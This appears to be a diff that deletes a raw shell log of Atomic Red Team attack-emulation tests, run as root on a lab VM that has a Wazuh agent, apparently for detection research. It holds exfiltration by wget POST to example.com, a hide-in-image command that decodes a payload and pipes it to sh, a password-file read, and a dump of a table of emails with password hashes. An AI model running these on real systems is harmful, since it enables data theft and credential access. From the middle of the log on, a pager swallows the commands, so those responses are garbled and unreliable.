@@ -1,1919 +1,0 @@
-action:
-command:whoami
-response:Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
-  System information as of Thu Mar 13 03:11:41 PM CST 2025
-
-  System load:  0.0732421875      Processes:             118
-  Usage of /:   58.6% of 9.74GB   Users logged in:       0
-  Memory usage: 18%               IPv4 address for ens3: 192.168.4.58
-  Swap usage:   0%
-
- * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
-   just raised the bar for easy, resilient and secure K8s cluster deployment.
-
-   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
-
-Expanded Security Maintenance for Applications is not enabled.
-
-198 updates can be applied immediately.
-129 of these updates are standard security updates.
-To see these additional updates run: apt list --upgradable
-
-2 additional security updates can be applied with ESM Apps.
-Learn more about enabling ESM Apps service at https://ubuntu.com/esm
-
-New release '24.04.2 LTS' available.
-Run 'do-release-upgrade' to upgrade to it.
-
-
-Last login: Thu Mar 13 01:49:51 2025 from 192.168.4.1
-
-root
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate https://example.com/ --delete-after
-response:
---2025-03-13 15:11:57--  https://example.com/
-Resolving example.com (example.com)... 23.215.0.138, 23.192.228.80, 23.215.0.136, ...
-Connecting to example.com (example.com)|23.215.0.138|:443... connected.
-HTTP request sent, awaiting response... 403 Forbidden
-2025-03-13 15:11:58 ERROR 403: Forbidden.
-
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
-response:
--bash: /home/atomic/evil_image.jpg: No such file or directory
-cat: /home/atomic/script.sh: No such file or directory
-strings: '/home/atomic/evil_image.jpg': No such file
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
-response:
-Reading package lists... 0%Reading package lists... 0%Reading package lists... 0%Reading package lists... 2%Reading package lists... 2%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 33%Reading package lists... 33%Reading package lists... 46%Reading package lists... 46%Reading package lists... 46%Reading package lists... 46%Reading package lists... 47%Reading package lists... 47%Reading package lists... 52%Reading package lists... 52%Reading package lists... 56%Reading package lists... 56%Reading package lists... 65%Reading package lists... 65%
-
-action:
-command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
-response:Reading package lists... 69%Reading package lists... 69%Reading package lists... 72%Reading package lists... 72%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 75%Reading package lists... 79%Reading package lists... 79%Reading package lists... 83%Reading package lists... 83%Reading package lists... 91%Reading package lists... 91%Reading package lists... 96%Reading package lists... 96%Reading package lists... 98%Reading package lists... 98%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... Done
-[1;31mE: [0mCould not get lock /var/lib/apt/lists/lock. It is held by process 25928 (apt)[0m
-[33mN: [0mBe aware that removing the lock file is not a solution and may break your system.[0m
-[1;31mE: [0mUnable to lock directory /var/lib/apt/lists/[0m
-[?2004hroot@pairlab-vserver:~# 
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:cd $HOME
-response:
-root@pairlab-vserver:~# 
-
-action:
-command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
-response:
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  8192  100  8192    0     0  52029      0 --:--:-- --:--:-- --:--:-- 52178
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
-response:
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100 12288  100 12288    0     0  75918      0 --:--:-- --:--:-- --:--:-- 76322
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
-response:
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   817  100   817    0     0   5146      0 --:--:-- --:--:-- --:--:--  5170
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:chmod +x sqlite_dump.sh
-response:
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
-response:
-./art
-List of tables:
-users
-Retrieving data from tables:
-Table: users
-1|bart@thesimpsons.com|32f8e0bb6944a6efe8b1351b72b8facc
-2|lisa@thesimpsons.com|bad6f1ca002d538211f2765e159c9c5f
-3|maggie@thesimpsons.com|88d4e59c78f144b9c793f60c97e8b02d
-4|marge@thesimpsons.com|c777e5de61c5b415b13b2bfc73395f9e
-
-./gta.db
-List of tables:
-releases
-cities
-Retrieving data from tables:
-Table: releases
-1997|Grand Theft Auto|state of New Guernsey
-1999|Grand Theft Auto 2|Anywhere, USA
-2001|Grand Theft Auto III|Liberty City
-2002|Grand Theft Auto: Vice City|Vice City
-2004|Grand Theft Auto: San Andreas|state of San Andreas
-2008|Grand Theft Auto IV|Liberty City
-2013|Grand Theft Auto V|Los Santos
-Table: cities
-Liberty City|New York
-
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:echo "Install netstat on the machine."; exit 1;
-response:
-
-
-action:
-command:netstat
-response:
-Command 'netstat' not found, but can be installed with:
-apt install net-tools
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:who -a
-response:
-           system boot  2025-03-11 15:02
-LOGIN      tty1         2025-03-11 15:02               712 id=tty1
-           run-level 5  2025-03-11 15:02
-root     + pts/0        2025-03-13 15:13   .         27423 (192.168.4.1)
-           pts/1        2025-03-13 15:13             27488 id=ts/1  term=0 exit=0
-           pts/2        2025-03-13 15:12             26572 id=ts/2  term=0 exit=0
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
-response:
-[?1h=[0m[0;4m [0m[0m[0;4m UNIT                                [0m[0m[0;4m LOAD  [0m[0m[0;4m ACTIVE[0m[0m[0;4m SUB    [0m[0m[0;4m DESCRIPTION       [m[7m>[m
-  apache2.service                      loaded active running The Apache HTTP Se[m[7m>[m
-  apparmor.service                     loaded active exited  Load AppArmor prof[m[7m>[m
-  apport.service                       loaded active exited  LSB: automatic cra[m[7m>[m
-  blk-availability.service             loaded active exited  Availability of bl[m[7m>[m
-  cloud-config.service                 loaded active exited  Apply the settings[m[7m>[m
-  cloud-final.service                  loaded active exited  Execute cloud user[m[7m>[m
-  cloud-init-local.service             loaded active exited  Initial cloud-init[m[7m>[m
-  cloud-init.service                   loaded active exited  Initial cloud-init[m[7m>[m
-  console-setup.service                loaded active exited  Set console font a[m[7m>[m
-  cron.service                         loaded active running Regular background[m[7m>[m
-  dbus.service                         loaded active running D-Bus System Messa[m[7m>[m
-  finalrd.service                      loaded active exited  Create final runti[m[7m>[m
-  fwupd.service                        loaded active running Firmware update da[m[7m>[m
-  getty@tty1.service                   loaded active running Getty on tty1[m
-  irqbalance.service                   loaded active running irqbalance daemon[m
-  keyboard-setup.service               loaded active exited  Set the console ke[m[7m>[m
-  kmod-static-nodes.service            loaded active exited  Create List of Sta[m[7m>[m
-  lvm2-monitor.service                 loaded active exited  Monitoring of LVM2[m[7m>[m
-  ModemManager.service                 loaded active running Modem Manager[m
-  multipathd.service                   loaded active running Device-Mapper Mult[m[7m>[m
-  mysql.service                        loaded active running MySQL Community Se[m[7m>[m
-  networkd-dispatcher.service          loaded active running Dispatcher daemon [m[7m>[m
-[7mlines 1-23[m[K
-
-action:
-command:sudo cat /etc/master.passwd > /tmp/T1003.008.txt
-response:[K-[Klog file: [Kuu[Kdd[Koo[K  [Kcc[Kaa[Ktt[K  [K//[Kee[Ktt[Kcc[K//[Kmm[Kaa[Kss[Ktt[Kee[Krr[K..[Kpp[Kaa[Kss[Kss[Kww[Kdd[K  [K>>[K  [K//[Ktt[Kmm[Kpp[K//[KTT[K11[K00[K00[K33[K..[K00[K00[K88[K..[Ktt[Kxx[Ktt[K[K[7mCannot write to "udo cat /etc/master.passwd > /tmp/T1003.008.txt"  (press RETURN)[m
-
-action:
-command:cat /tmp/T1003.008.txt
-response:[24;1H[K[H[J[H[H[J[H[0m[0;4m [0m[0m[0;4m UNIT                                [0m[0m[0;4m LOAD  [0m[0m[0;4m ACTIVE[0m[0m[0;4m SUB    [0m[0m[0;4m DESCRIPTION       [m[7m>[m
-  apache2.service                      loaded active running The Apache HTTP Se[m[7m>[m
-  apparmor.service                     loaded active exited  Load AppArmor prof[m[7m>[m
-  apport.service                       loaded active exited  LSB: automatic cra[m[7m>[m
-  blk-availability.service             loaded active exited  Availability of bl[m[7m>[m
-  cloud-config.service                 loaded active exited  Apply the settings[m[7m>[m
-  cloud-final.service                  loaded active exited  Execute cloud user[m[7m>[m
-  cloud-init-local.service             loaded active exited  Initial cloud-init[m[7m>[m
-  cloud-init.service                   loaded active exited  Initial cloud-init[m[7m>[m
-  console-setup.service                loaded active exited  Set console font a[m[7m>[m
-  cron.service                         loaded active running Regular background[m[7m>[m
-  dbus.service                         loaded active running D-Bus System Messa[m[7m>[m
-  finalrd.service                      loaded active exited  Create final runti[m[7m>[m
-  fwupd.service                        loaded active running Firmware update da[m[7m>[m
-  getty@tty1.service                   loaded active running Getty on tty1[m
-  irqbalance.service                   loaded active running irqbalance daemon[m
-  keyboard-setup.service               loaded active exited  Set the console ke[m[7m>[m
-  kmod-static-nodes.service            loaded active exited  Create List of Sta[m[7m>[m
-  lvm2-monitor.service                 loaded active exited  Monitoring of LVM2[m[7m>[m
-  ModemManager.service                 loaded active running Modem Manager[m
-  multipathd.service                   loaded active running Device-Mapper Mult[m[7m>[m
-  mysql.service                        loaded active running MySQL Community Se[m[7m>[m
-  networkd-dispatcher.service          loaded active running Dispatcher daemon [m[7m>[m
-[7mlines 1-23[m[K[K[7mlines 1-23[m[K[K[7mNo next tag  (press RETURN)[m[24;1H[K[K[7mlines 1-23[m[K[K/[Ktt[Kmm[Kpp[K//[KTT[K11[K00[K00[K33[K..[K00[K00[K88[K..[Ktt[Kxx[Ktt[K[1;1H[0m[0;4m [0m[0m[0;4m UNIT                                [0m[0m[0;4m LOAD  [0m[0m[0;4m ACTIVE[0m[0m[0;4m SUB    [0m[0m[0;4m DESCRIPTION       [m[7m>[m
-[2;1H  apache2.service                      loaded active running The Apache HTTP Se[m[7m>[m
-[3;1H  apparmor.service                     loaded active exited  Load AppArmor prof[m[7m>[m
-[4;1H  apport.service                       loaded active exited  LSB: automatic cra[m[7m>[m
-[5;1H  blk-availability.service             loaded active exited  Availability of bl[m[7m>[m
-[6;1H  cloud-config.service                 loaded active exited  Apply the settings[m[7m>[m
-[7;1H  cloud-final.service                  loaded active exited  Execute cloud user[m[7m>[m
-[8;1H  cloud-init-local.service             loaded active exited  Initial cloud-init[m[7m>[m
-[9;1H  cloud-init.service                   loaded active exited  Initial cloud-init[m[7m>[m
-[10;1H  console-setup.service                loaded active exited  Set console font a[m[7m>[m
-[11;1H  cron.service                         loaded active running Regular background[m[7m>[m
-[12;1H  dbus.service                         loaded active running D-Bus System Messa[m[7m>[m
-[13;1H  finalrd.service                      loaded active exited  Create final runti[m[7m>[m
-[14;1H  fwupd.service                        loaded active running Firmware update da[m[7m>[m
-[15;1H  getty@tty1.service                   loaded active running Getty on tty1[m
-[16;1H  irqbalance.service                   loaded active running irqbalance daemon[m
-[17;1H  keyboard-setup.service              
-
-action:
-command:if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
-response: loaded active exited  Set the console ke[m[7m>[m
-[18;1H  kmod-static-nodes.service            loaded active exited  Create List of Sta[m[7m>[m
-[19;1H  lvm2-monitor.service                 loaded active exited  Monitoring of LVM2[m[7m>[m
-[20;1H  ModemManager.service                 loaded active running Modem Manager[m
-[21;1H  multipathd.service                   loaded active running Device-Mapper Mult[m[7m>[m
-[22;1H  mysql.service                        loaded active running MySQL Community Se[m[7m>[m
-[23;1H  networkd-dispatcher.service          loaded active running Dispatcher daemon [m[7m>[m
-[24;1H[1;1H[0m[0;4m [0m[0m[0;4m UNIT                                [0m[0m[0;4m LOAD  [0m[0m[0;4m ACTIVE[0m[0m[0;4m SUB    [0m[0m[0;4m DESCRIPTION       [m[7m>[m
-[2;1H  apache2.service                      loaded active running The Apache HTTP Se[m[7m>[m
-[3;1H  apparmor.service                     loaded active exited  Load AppArmor prof[m[7m>[m
-[4;1H  apport.service                       loaded active exited  LSB: automatic cra[m[7m>[m
-[5;1H  blk-availability.service             loaded active exited  Availability of bl[m[7m>[m
-[6;1H  cloud-config.service                 loaded active exited  Apply the settings[m[7m>[m
-[7;1H  cloud-final.service                  loaded active exited  Execute cloud user[m[7m>[m
-[8;1H  cloud-init-local.service             loaded active exited  Initial cloud-init[m[7m>[m
-[9;1H  cloud-init.service                   loaded active exited  Initial cloud-init[m[7m>[m
-[10;1H  console-setup.service                loaded active exited  Set console font a[m[7m>[m
-[11;1H  cron.service                         loaded active running Regular background[m[7m>[m
-[12;1H  dbus.service                         loaded active running D-Bus System Messa[m[7m>[m
-[13;1H  finalrd.service                      loaded active exited  Create final runti[m[7m>[m
-[14;1H  fwupd.service                        loaded active running Firmware update da[m[7m>[m
-[15;1H  getty@tty1.service                   loaded active running Getty on tty1[m
-[16;1H  irqbalance.service                   loaded active running irqbalance daemon[m
-[17;1H  keyboard-setup.service               loaded active exited  Set the console ke[m[7m>[m
-[18;1H  kmod-static-nodes.service            loaded active exited  Create List of Sta[m[7m>[m
-[19;1H  lvm2-monitor.service                 loaded active exited  Monitoring of LVM2[m[7m>[m
-[20;1H  ModemManager.service                 loaded active running Modem Manager[m
-[21;1H  multipathd.service                   loaded active running Device-Mapper Mult[m[7m>[m
-[22;1H  mysql.service                        loaded active running MySQL Community Se[m[7m>[m
-[23;1H  networkd-dispatcher.service          loaded active running Dispatcher daemon [m[7m>[m
-[24;1H[K[7mPattern not found  (press RETURN)[m[24;1H[K[K[7mlines 1-23/68 38%[m[K[K  packagekit.service                   loaded active running PackageKit Daemon[m
-  plymouth-quit-wait.service           loaded active exited  Hold until boot pr[m[7m>[m
-  plymouth-quit.service                loaded active exited  Terminate Plymouth[m[7m>[m
-  plymouth-read-write.service          loaded active exited  Tell Plymouth To W[m[7m>[m
-  polkit.service                       loaded active running Authorization Mana[m[7m>[m
-  postfix.service                      loaded active exited  Postfix Mail Trans[m[7m>[m
-  postfix@-.service                    loaded active running Postfix Mail Trans[m[7m>[m
-  rc-local.service                     loaded active exited  /etc/rc.local Comp[m[7m>[m
-  rsyslog.service                      loaded active running System Logging Ser[m[7m>[m
-  setvtrgb.service                     loaded active exited  Set console scheme[m
-  snapd.apparmor.service               loaded active exited  Load AppArmor prof[m[7m>[m
-  snapd.seeded.service                 loaded act
-
-action:
-command:if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;
-response:ive exited  Wait until snapd i[m[7m>[m
-  snapd.service                        loaded active running Snap Daemon[m
-  ssh.service                          loaded active running OpenBSD Secure She[m[7m>[m
-  systemd-binfmt.service               loaded active exited  Set Up Additional [m[7m>[m
-  systemd-journal-flush.service        loaded active exited  Flush Journal to P[m[7m>[m
-  systemd-journald.service             loaded active running Journal Service[m
-  systemd-logind.service               loaded active running User Login Managem[m[7m>[m
-  systemd-modules-load.service         loaded active exited  Load Kernel Modules[m
-  systemd-networkd-wait-online.service loaded active exited  Wait for Network t[m[7m>[m
-  systemd-networkd.service             loaded active running Network Configurat[m[7m>[m
-  systemd-random-seed.service          loaded active exited  Load/Save Random S[m[7m>[m
-  systemd-remount-fs.service           loaded active exited  Remount Root and K[m[7m>[m
-[7mlines 24-46/68 71%[m[K[K  systemd-resolved.service             loaded active running Network Name Resol[m[7m>[m
-  systemd-sysctl.service               loaded active exited  Apply Kernel Varia[m[7m>[m
-  systemd-sysusers.service             loaded active exited  Create System Users[m
-  systemd-timesyncd.service            loaded active running Network Time Synch[m[7m>[m
-  systemd-tmpfiles-setup-dev.service   loaded active exited  Create Static Devi[m[7m>[m
-  systemd-tmpfiles-setup.service       loaded active exited  Create Volatile Fi[m[7m>[m
-  systemd-udev-trigger.service         loaded active exited  Coldplug All udev [m[7m>[m
-  systemd-udevd.service                loaded active running Rule-based Manager[m[7m>[m
-  systemd-update-utmp.service          loaded active exited  Record System Boot[m[7m>[m
-  systemd-user-sessions.service        loaded active exited  Permit User Sessio[m[7m>[m
-  udisks2.service                      loaded active running Disk Manager[m
-  ufw.service                          loaded active exited  Uncomplicated fire[m[7m>[m
-  upower.service                       loaded active running Daemon for power m[m[7m>[m
-  user-runtime-dir@0.service           loaded active exited  User Runtime Direc[m[7m>[m
-  user@0.service                       loaded active running User Manager for U[m[7m>[m
-  wazuh-agent.service                  loaded active running Wazuh agent[m
-[m
-LOAD   = Reflects whether the unit definition was properly loaded.[m
-ACTIVE = The high-level unit activation state, i.e. generalization of SUB.[m
-SUB    = The low-level unit activation state, values depend on unit type.[m
-[0;1;39m61 loaded units listed.[0m Pass --all to see loaded but inactive units, too.[m
-To show all installed unit files use 'systemctl list-unit-files'.[m
-[7mlines 46-68/68 (END)[m[K[KBrackets: [K[[[K]][K[K[7mNo bracket in top line  (press RETURN)[m[24;1H[K[K[7mlines 46-68/68 (END)[m[K[K-[KTab stops: [K  [K""[K$$[K(([Kcc[Koo[Kmm[Kmm[Kaa[Knn[Kdd[K  [K--[Kvv[K  [Kdd[Kss[Kcc[Kaa[Kcc[Khh[Kee[Kuu[Ktt[Kii[Kll[K))[K""[K  [K]][K;;[K  [Ktt[Khh[Kee[Knn[K  [Kdd[Kss[Kcc[Kaa[Kcc[Khh[Kee[Kuu[Ktt[Kii[Kll[K  [K--[Kqq[K  [Kgg[Krr[Koo[Kuu[Kpp[K;;[K  [Kee[Kll[Kss[Kee[K  [Kee[Kcc[Khh[Koo[K[Ken dscacheutil -q group; else echo  [K""[Kdd[Kss[Kcc[Kaa[Kcc[Khh[Kee[Kuu[Ktt[Kii[Kll[K  [Kii[Kss[K  [Kmm[Kii[Kss[Kss[Kii[Knn[Kgg[K  [Kff[Krr[Koo[Kmm[K  [Ktt[Khh[Kee[K  [K[K "dscacheutil is missing from the mm[Kaa[Kcc[Khh[Kii[Knn[Kee[K..[K  [Kss[Kkk[Kii[Kpp[Kpp[Kii[Knn[Kgg[K..[K..[K..[K""[K;;[K  [Kff[Kii[K;;[K[H[J[H  systemd-remount-fs.service           loaded ac
-
-action:
-command:if [ -x "$(command -v groups)" ]; then groups; else echo "groups is missing from the machine. skipping..."; fi;
-response:tive exited  Remount Root and K[m[7m>[m
-  systemd-resolved.service             loaded active running Network Name Resol[m[7m>[m
-  systemd-sysctl.service               loaded active exited  Apply Kernel Varia[m[7m>[m
-  systemd-sysusers.service             loaded active exited  Create System Users[m
-  systemd-timesyncd.service            loaded active running Network Time Synch[m[7m>[m
-  systemd-tmpfiles-setup-dev.service   loaded active exited  Create Static Devi[m[7m>[m
-  systemd-tmpfiles-setup.service       loaded active exited  Create Volatile Fi[m[7m>[m
-  systemd-udev-trigger.service         loaded active exited  Coldplug All udev [m[7m>[m
-  systemd-udevd.service                loaded active running Rule-based Manager[m[7m>[m
-  systemd-update-utmp.service          loaded active exited  Record System Boot[m[7m>[m
-  systemd-user-sessions.service        loaded active exited  Permit User Sessio[m[7m>[m
-  udisks2.service                      loaded active running Disk Manager[m
-  ufw.service                          loaded active exited  Uncomplicated fire[m[7m>[m
-  upower.service                       loaded active running Daemon for power m[m[7m>[m
-  user-runtime-dir@0.service           loaded active exited  User Runtime Direc[m[7m>[m
-  user@0.service                       loaded active running User Manager for U[m[7m>[m
-  wazuh-agent.service                  loaded active running Wazuh agent[m
-[m
-LOAD   = Reflects whether the unit definition was properly loaded.[m
-ACTIVE = The high-level unit activation state, i.e. generalization of SUB.[m
-SUB    = The low-level unit activation state, values depend on unit type.[m
-[0;1;39m61 loaded units listed.[0m Pass --all to see loaded but inactive units, too.[m
-To show all installed unit files use 'systemctl list-unit-files'.[m
-[7mlines 46-68/68 (END)[m[K[K[7mlines 46-68/68 (END)[m[K[K[K[7mlines 46-68/68 (END)[m[K[K[K[7mlines 46-68/68 (END)[m[K[KBrackets: [K[[[K]][K[K[7mNo bracket in top line  (press RETURN)[m[24;1H[K[K[7mlines 46-68/68 (END)[m[K[K-[KTab stops: [K  [K""[K$$[K(([Kcc[Koo[Kmm[Kmm[Kaa[Knn[Kdd[K  [K--[Kvv[K  [Kdd[Kss[Kcc[Kll[K))[K""[K  [K]][K;;[K  [Ktt[Khh[Kee[Knn[K  [Kdd[Kss[Kcc[Kll[K  [K..[K  [K--[Kll[Kii[Kss[Ktt[K  [K//[KGG[Krr[Koo[Kuu[Kpp[Kss[K;;[K  [Kee[Kll[Kss[Kee[K  [Kee[Kcc[Khh[Koo[K  [K""[Kdd[Kss[Kcc[Kll[K  [K[K . -list /Groups; else echo "dscl ii[Kss[K  [Kmm[Kii[Kss[Kss[Kii[Knn[Kgg[K  [Kff[Krr[Koo[Kmm[K  [Ktt[Khh[Kee[K  [Kmm[Kaa[Kcc[Khh[Kii[Knn[Kee[K..[K  [Kss[Kkk[Kii[Kpp[Kpp[K[Kis missing from the machine. skippii[Knn[Kgg[K..[K..[K..[K""[K;;[K  [Kff[Kii[K;;[K[H[J[H  systemd-remount-fs.service           loaded active exited  Remount Root and K[m[7m>[m
-  systemd-resolved.service             loaded active running Network Name Resol[m[7m>[m
-  systemd-sysctl.service               loaded active exited  Apply Kernel Varia[m[7m>[m
-  systemd-sysusers.service             loaded active exited  Create System Users[m
-  systemd-timesyncd.service            loaded active running Network Time Synch[m[7m>[m
-  systemd-tmpfiles-setup-dev.service   loaded active exited  Create Static Devi[m[7m>[m
-  systemd-tmpfiles-setup.service       loaded active exited  Create Volatile Fi[m[7m>[m
-  systemd-udev-trigger.service         loaded active exited  Coldplug All udev [m[7m>[m
-  systemd-udevd.service                loaded active running Rule-based Manager[m[7m>[m
-  systemd-update-utmp.service          loaded active exited  Record System Boot[m[7m>[m
-  systemd-user-sessions.service        loaded active exited  Permit User Sessio[m[7m>[m
-  udisks2.service        
-
-action:
-command:if [ -x "$(command -v id)" ]; then id; else echo "id is missing from the machine. skipping..."; fi;
-response:              loaded active running Disk Manager[m
-  ufw.service                          loaded active exited  Uncomplicated fire[m[7m>[m
-  upower.service                       loaded active running Daemon for power m[m[7m>[m
-  user-runtime-dir@0.service           loaded active exited  User Runtime Direc[m[7m>[m
-  user@0.service                       loaded active running User Manager for U[m[7m>[m
-  wazuh-agent.service                  loaded active running Wazuh agent[m
-[m
-LOAD   = Reflects whether the unit definition was properly loaded.[m
-ACTIVE = The high-level unit activation state, i.e. generalization of SUB.[m
-SUB    = The low-level unit activation state, values depend on unit type.[m
-[0;1;39m61 loaded units listed.[0m Pass --all to see loaded but inactive units, too.[m
-To show all installed unit files use 'systemctl list-unit-files'.[m
-[7mlines 46-68/68 (END)[m[K[K[7mlines 46-68/68 (END)[m[K[K[K[7mlines 46-68/68 (END)[m[K[K[K[7mlines 46-68/68 (END)[m[K[KBrackets: [K[[[K]][K[K[7mNo bracket in top line  (press RETURN)[m[24;1H[K[K[7mlines 46-68/68 (END)[m[K[K-[KTab stops: [K  [K""[K$$[K(([Kcc[Koo[Kmm[Kmm[Kaa[Knn[Kdd[K  [K--[Kvv[K  [Kgg[Krr[Koo[Kuu[Kpp[Kss[K))[K""[K  [K]][K;;[K  [Ktt[Khh[Kee[Knn[K  [Kgg[Krr[Koo[Kuu[Kpp[Kss[K;;[K  [Kee[Kll[Kss[Kee[K  [Kee[Kcc[Khh[Koo[K  [K""[Kgg[Krr[Koo[Kuu[Kpp[Kss[K  [Kii[Kss[K  [Kmm[Kii[Kss[Kss[Kii[Knn[Kgg[K[Koups; else echo "groups is missing  [Kff[Krr[Koo[Kmm[K  [Ktt[Khh[Kee[K  [Kmm[Kaa[Kcc[Khh[Kii[Knn[Kee[K..[K  [Kss[Kkk[Kii[Kpp[Kpp[Kii[Knn[Kgg[K..[K..[K..[K""[K;;[K  [Kff[K[K from the machine. skipping..."; fii[K;;[K[H[J[H  systemd-remount-fs.service           loaded active exited  Remount Root and K[m[7m>[m
-  systemd-resolved.service             loaded active running Network Name Resol[m[7m>[m
-  systemd-sysctl.service               loaded active exited  Apply Kernel Varia[m[7m>[m
-  systemd-sysusers.service             loaded active exited  Create System Users[m
-  systemd-timesyncd.service            loaded active running Network Time Synch[m[7m>[m
-  systemd-tmpfiles-setup-dev.service   loaded active exited  Create Static Devi[m[7m>[m
-  systemd-tmpfiles-setup.service       loaded active exited  Create Volatile Fi[m[7m>[m
-  systemd-udev-trigger.service         loaded active exited  Coldplug All udev [m[7m>[m
-  systemd-udevd.service                loaded active running Rule-based Manager[m[7m>[m
-  systemd-update-utmp.service          loaded active exited  Record System Boot[m[7m>[m
-  systemd-user-sessions.service        loaded active exited  Permit User Sessio[m[7m>[m
-  udisks2.service                      loaded active running Disk Manager[m
-  ufw.service                          loaded active exited  Uncomplicated fire[m[7m>[m
-  upower.service                       loaded active running Daemon for power m[m[7m>[m
-  user-runtime-dir@0.service           loaded active exited  User Runtime Direc[m[7m>[m
-  user@0.service                       loaded active running User Manager for U[m[7m>[m
-  wazuh-agent.service                  loaded active running Wazuh agent[m
-[m
-LOAD   = Reflects whether the unit definition was properly loaded.[m
-ACTIVE = The high-level unit activation state, i.e. generalization of SUB.[m
-SUB    = The low-level unit activation state, values depend on unit type.[m
-[0;1;39m61 loaded units listed.[0m Pass --all to see loaded but inactive units, too.[m
-To show all installed unit files use 'systemctl list-unit-files'.[m
-[7mlines 46-68/68 (END)[m[K[K[7mlines 46-68/68 (END)[m[K[K[K[7mlines 46-68/68 (END)[m[K[K[K[7mlines 46-68/68 (END)[m[K[KBrac
-
-action:
-command:if [ -x "$(command -v getent)" ]; then getent group; else echo "getent is missing from the machine. skipping..."; fi;
-response:kets: [K[[[K]][K[K[7mNo bracket in top line  (press RETURN)[m[24;1H[K[K[7mlines 46-68/68 (END)[m[K[K-[KTab stops: [K  [K""[K$$[K(([Kcc[Koo[Kmm[Kmm[Kaa[Knn[Kdd[K  [K--[Kvv[K  [Kii[Kdd[K))[K""[K  [K]][K;;[K  [Ktt[Khh[Kee[Knn[K  [Kii[Kdd[K;;[K  [Kee[Kll[Kss[Kee[K  [Kee[Kcc[Khh[Koo[K  [K""[Kii[Kdd[K  [Kii[Kss[K  [Kmm[Kii[Kss[Kss[Kii[Knn[Kgg[K  [Kff[Krr[Koo[Kmm[K  [Ktt[Khh[Kee[K  [Kmm[Kaa[K[Kse echo "id is missing from the macc[Khh[Kii[Knn[Kee[K..[K  [Kss[Kkk[Kii[Kpp[Kpp[Kii[Knn[Kgg[K..[K..[K..[K""[K;;[K  [Kff[Kii[K;;[K[H[J[H  systemd-remount-fs.service           loaded active exited  Remount Root and K[m[7m>[m
-  systemd-resolved.service             loaded active running Network Name Resol[m[7m>[m
-  systemd-sysctl.service               loaded active exited  Apply Kernel Varia[m[7m>[m
-  systemd-sysusers.service             loaded active exited  Create System Users[m
-  systemd-timesyncd.service            loaded active running Network Time Synch[m[7m>[m
-  systemd-tmpfiles-setup-dev.service   loaded active exited  Create Static Devi[m[7m>[m
-  systemd-tmpfiles-setup.service       loaded active exited  Create Volatile Fi[m[7m>[m
-  systemd-udev-trigger.service         loaded active exited  Coldplug All udev [m[7m>[m
-  systemd-udevd.service                loaded active running Rule-based Manager[m[7m>[m
-  systemd-update-utmp.service          loaded active exited  Record System Boot[m[7m>[m
-  systemd-user-sessions.service        loaded active exited  Permit User Sessio[m[7m>[m
-  udisks2.service                      loaded active running Disk Manager[m
-  ufw.service                          loaded active exited  Uncomplicated fire[m[7m>[m
-  upower.service                       loaded active running Daemon for power m[m[7m>[m
-  user-runtime-dir@0.service           loaded active exited  User Runtime Direc[m[7m>[m
-  user@0.service                       loaded active running User Manager for U[m[7m>[m
-  wazuh-agent.service                  loaded active running Wazuh agent[m
-[m
-LOAD   = Reflects whether the unit definition was properly loaded.[m
-ACTIVE = The high-level unit activation state, i.e. generalization of SUB.[m
-SUB    = The low-level unit activation state, values depend on unit type.[m
-[0;1;39m61 loaded units listed.[0m Pass --all to see loaded but inactive units, too.[m
-To show all installed unit files use 'systemctl list-unit-files'.[m
